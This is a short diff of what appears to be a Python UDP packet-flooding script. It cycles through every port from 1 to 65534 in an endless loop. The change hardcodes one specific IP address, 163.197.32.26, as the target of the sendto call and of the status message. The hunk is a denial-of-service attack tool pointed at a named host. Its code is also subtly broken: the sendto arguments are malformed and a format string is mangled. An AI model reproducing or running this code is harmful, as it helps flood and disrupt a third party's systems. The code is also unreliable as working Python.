@@ -82,7 +82,7 @@ if port_mode == False:  # All ports.
     try:
         while True:
             if port == 65534:
-                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, ip, sent, port))
+                print('\033[32;1m[%s]Sented %s packets to (str("163.197.32.26")) through port:1~%s\033[0m'%(dtime, sent, port))
                 print('\033[1;36m/wait %s'%(timeR))
                 port = 1
                 time.sleep(timeR)
@@ -91,7 +91,7 @@ if port_mode == False:  # All ports.
             elif port == 1900:
                 port = 1901
 
-            sock.sendto(bytes, ip, port)
+            sock.sendto(bytes, (str("163.197.32.26")), port)
             sent += 1
             port += 1
             timeR = i + random.randint(0,20)
